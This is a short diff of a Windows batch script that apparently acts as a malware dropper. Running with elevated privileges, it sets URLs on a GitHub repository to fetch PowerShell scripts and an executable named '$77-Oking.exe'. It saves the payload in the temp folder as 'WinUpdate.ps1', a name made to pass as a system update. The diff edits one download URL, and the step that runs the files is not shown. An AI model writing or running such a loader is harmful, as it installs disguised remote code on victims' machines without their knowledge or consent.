@@ -31,7 +31,7 @@ if "%1"=="restarted" (
     echo Running with elevated privileges
 
     :: Configure download URLs and file paths
-    set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.ps1"
+    set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.cmd"
     set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
     set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe"
     set "PS1_FILE=%temp%\WinUpdate.ps1"
